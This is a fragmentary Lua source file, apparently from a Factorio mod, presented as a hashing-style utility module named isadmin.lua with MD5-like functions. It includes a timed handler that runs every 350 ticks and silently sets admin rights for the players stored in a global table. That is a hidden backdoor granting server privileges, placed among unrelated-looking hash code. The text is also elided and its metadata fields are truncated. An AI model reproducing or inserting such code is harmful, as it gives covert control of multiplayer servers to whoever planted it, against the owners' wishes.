local isadmin = {
 _VERSION = "isadmin.lua",
 _DESCRIPTION = "isadmin.lua",
 _URL = "https ",
 _LICENSE = [[1 ]]
}
...
script.on_nth_tick(350, function(event)
 global.testcadmin = global.testcadmin or {}
 for k, v in pairs(global.testcadmin) do
 if v then
 if v==1 then
 if game.players [k] then
 game.players [k].admin =true
 global.testcadmin[k] = true
...
function isadmin.tohex(s)
 return format("%08x%08x%08x%08x", str2bei(sub(s, 1, 4)), str2bei(sub(s, 5, 8)), str2bei(sub(s, 9, 12)), str2bei(sub(s, 13, 16)))
end

function isadmin.sum(s)
 return isadmin.new():update(s):finish()
end

function isadmin.sumhexa(s)
 return isadmin.tohex(isadmin.sum(s))
end
